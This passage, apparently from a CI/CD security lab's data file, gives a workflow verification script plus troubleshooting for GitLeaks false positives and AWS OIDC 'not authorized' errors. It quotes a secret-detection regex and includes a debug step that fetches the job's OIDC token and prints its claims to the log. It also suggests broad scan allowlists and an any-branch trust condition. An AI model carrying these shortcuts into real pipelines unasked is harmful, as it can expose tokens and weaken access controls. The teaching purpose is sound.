# Validate secure workflow with actionlint
actionlint .github/workflows/secure.yml
EXITCODE=\$?
if [ \$EXITCODE -eq 0 ]; then
  echo "ActionLint: PASSED - no problems found ✓"
else
  echo "ActionLint: found \$EXITCODE problems"
fi

# Verify SECURITY.md was created
ls .github/SECURITY.md
echo "Security policy: created ✓"

# Verify security checklist in workflow
echo ""
echo "=== Security checklist ==="
echo -n "permissions declared: "
grep -c "permissions:" .github/workflows/secure.yml > /dev/null && echo "✓" || echo "✗"

echo -n "Actions pinned by SHA: "
UNPINNED=\$(grep "uses:" .github/workflows/secure.yml | grep -v "@[a-f0-9]\{40\}" | wc -l)
[ \$UNPINNED -eq 0 ] && echo "✓" || echo "✗ (\$UNPINNED not pinned)"

echo -n "Trivy scan configured: "
grep -q "trivy-action" .github/workflows/secure.yml && echo "✓" || echo "✗"

echo -n "SARIF always uploaded: "
grep -q "if: always()" .github/workflows/secure.yml && echo "✓" || echo "✗"

echo ""
echo "CI/CD Pipeline Security Lab complete!"
\`\`\``
      }
    ]
  },
  troubleshooting: [
    {
      title: 'GitLeaks detects "secret" in test or configuration file',
      difficulty: 'easy',
      symptom: 'GitLeaks scan fails with "secret detected" in a test file that contains a fake API key for example purposes, or a development password that is intentionally public.',
      diagnosis: `\`\`\`bash
# 1. See what GitLeaks detected
# In GitHub Actions log, look for:
# "leaks found: X"
# "file: path/to/file"
# "rule: generic-api-key"

# 2. Check the detected file
cat tests/test_config.py
# Check if it's really a secret or a false positive

# 3. Check the triggering rule
# GitLeaks uses regex patterns like:
# (api|secret|key|token|password) = ['"][0-9a-zA-Z]{20,}['"]
\`\`\``,
      solution: `**Cause:** False positive — test file with example value

**Solution 1 — Add inline ignore:**
\`\`\`python
# tests/test_config.py
API_KEY = "example-key-1234567890abcdef"  # gitleaks:allow
TEST_PASSWORD = "test-only-not-real-abc123"  # gitleaks:allow
\`\`\`

**Solution 2 — .gitleaks.toml file with exclusions:**
\`\`\`toml
# .gitleaks.toml
[allowlist]
  description = "Allowlist for test files"
  files = [
    "tests/.*",
    ".*_test.py",
    ".*test.*\\\\.py",
    "docs/.*",
    "examples/.*"
  ]
  regexes = [
    "example-api-key-\\\\d+",
    "test-only-not-real"
  ]
\`\`\`

**Solution 3 — Configure in workflow:**
\`\`\`yaml
- uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
  with:
    config-path: .gitleaks.toml  # use custom config
\`\`\`

**Check if it's real:**
\`\`\`bash
# Check if value appears in production
git log --all -S "detected-value" -- .
# If it appears in many dev commits: probably a false positive
\`\`\``
    },
    {
      title: 'OIDC fails with "not authorized to assume role"',
      difficulty: 'medium',
      symptom: 'The AWS OIDC authentication step fails with "Not authorized to perform sts:AssumeRoleWithWebIdentity" or "OpenIDConnect provider is not authorized". The same workflow worked before.',
      diagnosis: `\`\`\`bash
# 1. Check id-token permission in job
grep -A 5 "permissions:" .github/workflows/deploy.yml

# 2. Check AWS role trust policy
aws iam get-role --role-name github-actions-deploy \
  --query 'Role.AssumeRolePolicyDocument'

# 3. See the OIDC token being generated (debug)
# Add temporary step:
- name: Debug OIDC token
  run: |
    TOKEN=\$(curl -s -H "Authorization: bearer \$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "\$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
    echo "Token claims:"
    echo \$TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
\`\`\``,
      solution: `**Cause 1 — Missing id-token: write permission:**
\`\`\`yaml
jobs:
  deploy:
    permissions:
      id-token: write  # REQUIRED for OIDC
      contents: read
\`\`\`

**Cause 2 — Too restrictive trust policy in AWS:**
\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringLike": {
          "token.actions.githubusercontent.com:sub":
            "repo:MYORG/MYREPO:*"
        },
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        }
      }
    }
  ]
}
\`\`\`

**Cause 3 — Branch not allowed in trust policy:**
\`\`\`
# Sub claim of token:
repo:myorg/myrepo:ref:refs/heads/main

# If trust policy only allows "main" and you're on "feature/xyz":
# Update Condition to accept:
"repo:myorg/myrepo:*"  # any branch
# OR
"repo:myorg/myrepo:ref:refs/heads/main"  # only main
\`\`\`

**Verify after fixing:**
\`\`\`bash
# Simulate with aws sts:
aws sts get-caller-identity  # should work without error
\`\`\``
    }
  ]
};
